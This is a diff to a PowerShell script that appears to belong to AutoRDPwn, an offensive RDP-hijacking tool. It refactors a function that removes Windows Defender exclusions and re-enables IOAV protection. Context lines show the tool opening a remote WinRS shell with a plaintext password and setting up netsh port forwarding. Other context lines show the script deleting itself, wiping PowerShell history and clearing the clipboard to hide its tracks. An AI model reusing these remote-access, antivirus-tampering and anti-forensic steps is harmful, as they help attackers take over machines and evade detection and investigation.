@@ -64,14 +64,11 @@ function Test-Command {
     Catch {RETURN $false}
     Finally {$ErrorActionPreference=$oldPreference}}
 
-function Remove-Exclusions-All { 
-    $Preferences = Get-MpPreference
-    $Exclusion1 = $Preferences.ExclusionPath
-    foreach ($path in $Exclusion1) { Remove-MpPreference -ExclusionPath $path }
-    $Exclusion2 = $Preferences.ExclusionExtension
-    foreach ($exe in $Exclusion2) { Remove-MpPreference -ExclusionExtension $exe }
-    $Exclusion3 = $Preferences.ExclusionProcess
-    foreach ($process in $Exclusion3) { Remove-MpPreference -ExclusionProcess $process }}
+function Remove-Exclusions { 
+    $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
+    $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
+    $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
+    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null } 
 
     do { Show-Banner ; Show-Language
     $help = 'The detailed guide of use can be found at the following link:'
@@ -623,5 +620,4 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/ma
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }} if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }}
-$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-MpPreference -ExclusionExtension ".exe" 2>&1> $null
-Remove-MpPreference -ExclusionProcess $pid 2>&1> $null ; Remove-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Set-Clipboard $null 2>&1> $null
+$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions ; Set-Clipboard $null 2>&1> $null
